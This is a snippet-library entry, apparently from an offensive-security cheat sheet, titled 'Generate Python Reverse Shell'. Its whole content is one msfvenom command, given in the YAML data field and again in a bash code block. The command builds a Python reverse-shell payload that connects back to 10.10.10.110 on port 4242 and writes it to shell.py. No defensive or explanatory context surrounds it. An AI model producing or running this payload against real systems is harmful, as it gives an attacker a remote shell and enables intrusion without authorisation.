---
id: ba5f3242-3f0c-414a-9050-85c6e4518840
name: Generate Python Reverse Shell
type: command
executor: bash
data: $ msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw
  > shell.py
output: null
created_at: '2023-04-06T03:56:21.275595+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
---

# Generate Python Reverse Shell

```bash
$ msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
```
